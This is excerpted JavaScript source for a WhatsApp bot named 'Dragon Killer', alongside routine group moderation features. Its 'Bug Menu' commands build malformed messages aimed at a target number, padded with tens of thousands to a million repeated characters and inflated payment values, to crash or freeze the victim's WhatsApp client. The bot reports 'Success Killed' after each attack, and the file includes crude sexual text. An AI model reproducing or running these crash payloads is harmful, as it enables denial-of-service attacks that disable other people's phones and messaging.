...
📝 | Created By  𝗖𝗼𝗻𝗳𝗼𝗻𝘁𝗲𝗿 / Ryo
🖥️ | Base Ori By   𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿 / Ryo
...
await ryozingod.updateProfileStatus(`✳️ Dragon - Killer By :  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿 || ✅ Runtime : ${uptime}`)
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"𝕯𝖗𝖆𝖌𝖔𝖓\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
selectedButtonId: 'pois0n - Dragon',
type: 1,
response: {
...
title: `© Dragon Killer version 1.0`,
body: `${ucapanWaktu} ${m.pushName} 👋`,
previewType: "VIDEO",
thumbnail: selectedThumbnail,
sourceUrl: `https://www.instagram.com/confronter._?igsh=MXBtY3hycTIyb3pqZQ==`,
mediaUrl: `https://whatsapp.com/channel/0029Vag3MeuGJP8LZb1Okj39`
}
},
text: teks
}, {
...
ryozingod.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 ...
 // Antiwame by geekz and modified by  ⁂𝙠𝙤𝙣𝙠𝙮⁂
if (AntiWame)
...
//antivirtex by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
  if (AntiVirtex) {
  if (budy.length > 3500) {
...
//anti bad words by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
...
//antiasing by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
...
//antilink youtube video by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
...
//antilink youtube channel by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
...
//antilink instagram by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
...
//antilink facebook by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
if (AntiLinkFacebook)
...
//antilink telegram by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
if (AntiLinkTelegram)
...
//antilink tiktok by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
if (AntiLinkTiktok)
...
//antilink twitter by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
if (AntiLinkTwitter)
...
//antilink all by geekz and modified by  𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿
if (AntiLinkAll)
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🩸𝕯𝖗𝖆𝖌𝖔𝖓.xp`+"ꦾ".repeat(60000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
...
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    ...
    "fileName": `🩸𝕯𝖗𝖆𝖌𝖔𝖓.xp`+"ྦྷ".repeat(60000),
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "𝐇𝐨𝐰 𝐭𝐨 𝐡𝐚𝐜𝐤😍",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/4d3698b33ef3d46fb6b7a.jpg" } }, { upload: ryozingod.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #𝒄𝒐𝒏𝒇𝒓𝒐𝒏𝒕𝒆𝒓 𝒓𝒆𝒈𝒂𝒓𝒅𝒔"
      },
      nativeFlowMessage: {
...
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝑾𝒉𝒂𝒕𝒔𝒂𝒑𝒑 𝒉𝒊𝒅𝒅𝒆𝒏 𝒇𝒆𝒂𝒕𝒖𝒓𝒆𝒔"+" ".repeat(920000),
        'footerText': `𝖙𝖆𝖕 𝖎𝖙𝖊𝖒𝖘`,
        'description': `𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐟𝐞𝐚𝐭𝐮𝐫𝐞𝐬`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
...
┏❐   \`Owner Cmd\` 
┃
┃⭔ ${prefix}Addprem 2547##/TAG 30d
┃⭔ ${prefix}Dellprem 2547##/TAG 30d
┃⭔ ${prefix}addowner 2547####
┃⭔ ${prefix}delowner 2547####
┃⭔ ${prefix}zero-bug 2547####
...
"footer": {
"text": "𝐕𝐢𝐞𝐰 𝐚𝐥𝐥 𝐡𝐢𝐝𝐝𝐞𝐧 𝐰𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐟𝐞𝐚𝐭𝐮𝐫𝐞𝐬"
},
"nativeFlowMessage": {
"buttons": [
{
...
┏❐  *Bug Menu*
┃
┃⭔ ${prefix}sipilist 2547###
┃⭔ ${prefix}1hit 2548###
┃⭔ ${prefix}1shoot 2547###
┃⭔ ${prefix}mimir 2547###
┃⭔ ${prefix}fatal-notif 2547###
┃⭔ ${prefix}fatal-ui 2547###
┃⭔ ${prefix}crash-total 2547###
┃⭔ ${prefix}forces-sql 2547###
┃⭔ ${prefix}bug-rom 2547###
┃⭔ ${prefix}restart-ui 2547###
┃⭔ ${prefix}zero-bug 2547###
┃⭔ ${prefix}bug-s 2547###
┃⭔ ${prefix}virg4m 2547###
┃⭔ ${prefix}bijibapakkau 2547###
┃⭔ ${prefix}samsung-chace 2547###
...
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"DRAGON\nAKU SUKA AMA LOBANG BOOL KAMU, AYO NGEGAY😋😘\",\"id\":\".terkentod\"}"
}
],
"messageParamsJson": ""
}
...
//=================================================//
case 'sc': case 'script': {
joreply(`🤍𝐒𝐜𝐫𝐢𝐩𝐭 𝐨𝐟 𝐃𝐫𝐚𝐠𝐨𝐧 𝐊𝐢𝐥𝐥𝐞𝐫 𝐕𝟏 𝐢𝐬 𝐛𝐞𝐥𝐨𝐰.

❕Channel : ${global.yt}
❗Owner : Wa.me/254796283064
🤍𝐒𝐜: https://github.com/Frank-AI-Tech/Dragon-V1
...
let namaown = `𝐌𝐲 𝐎𝐰𝐧𝐞𝐫 𝐈𝐬 𝐂𝐨𝐧𝐟𝐫𝐨𝐧𝐭𝐞𝐫`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ 𝐃𝐫𝐚𝐠𝐨𝐧 𝐊𝐢𝐥𝐥𝐞𝐫༑ ]]\nX-WA-BIZ-NAME: [[ 𝐃𝐫𝐚𝐠𝐨𝐧 𝐊𝐢𝐥𝐥𝐞𝐫 ༑ ]]\nEND:VCARD`,
}
...
message: {
  "interactiveMessage": {
    ...
    "footer": {
      "text": " 𝗖𝗼𝗻𝗳𝗿𝗼𝗻𝘁𝗲𝗿 © Zero Execution Vault"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
...
joreply(`⚰️𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝑲𝒊𝒍𝒍𝒆𝒅 ${target} 𝑵𝒐 𝑴𝒆𝒓𝒄𝒚 ${command}. 𝑴𝒊𝒔𝒔𝒊𝒐𝒏 𝑫𝒆𝒔𝒕𝒓𝒐𝒚🩸`)
}
break
//=================================================//
...
joreply(`💀𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝑲𝒊𝒍𝒍𝒆𝒅 ${target} 𝑵𝒐 𝑴𝒆𝒓𝒄𝒚 ${command}. 𝑴𝒊𝒔𝒔𝒊𝒐𝒏 𝑫𝒆𝒔𝒕𝒓𝒐𝒚🩸`)
}
break
//=================================================//
...
joreply(`⚰️𝑺𝒖𝒄𝒆𝒔𝒔 𝑲𝒊𝒍𝒍𝒆𝒅 ${target} 𝑴𝒊𝒔𝒔𝒊𝒐𝒏 𝒅𝒆𝒔𝒕𝒓𝒐𝒚 ${ppk} detik`)
}
break
//=================================================//
...
message: {
  "interactiveMessage": {
    ...
    "body": {
      "text": "𝒊𝒏𝒋𝒆𝒄𝒕𝒊𝒏𝒈 𝑫𝒓𝒂𝒈𝒐𝒏 𝒗𝒊𝒓𝒖𝒔 𝒎𝒐𝒕𝒉𝒆𝒓𝒇𝒖𝒄𝒌𝒆𝒓🦠"
    },
    "footer": {
      "text": "›          #𝕮𝖔𝖓𝖋𝖗𝖔𝖓𝖙𝖊𝖗 𝖗𝖊𝖌𝖆𝖗𝖉𝖘"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '𝑫𝑹𝑨𝑮𝑶𝑵💀', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
...
joreply(`✨𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝒌𝒊𝒍𝒍𝒆𝒅 ${target} 𝑵𝒐 𝑴𝒆𝒓𝒄𝒚 ${command}. 𝑷𝒍𝒆𝒂𝒔𝒆 𝒑𝒂𝒖𝒔𝒆 𝒃𝒆𝒇𝒐𝒓𝒆 2 𝑴𝒊𝒏𝒖𝒕𝒆𝒔 𝒔𝒐 𝒃𝒐𝒕 𝒏𝒐𝒕 𝒃𝒂𝒏𝒏𝒆𝒅🩸`)
}
break
//=================================================//
...
joreply(`✨𝑺𝒖𝒄𝒄𝒆𝒔𝒔 𝑲𝒊𝒍𝒍𝒆𝒅 ${target} 𝑵𝒐 𝑴𝒆𝒓𝒄𝒚 ${command}. 𝑴𝒊𝒔𝒔𝒊𝒐𝒏 𝒊𝒔 𝒕𝒐 𝒅𝒆𝒔𝒕𝒓𝒐𝒚🩸`)
}
break
//=================================================//
case 'temp-ban': {
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝑫𝑹𝑨𝑮𝑶𝑵⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(30000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
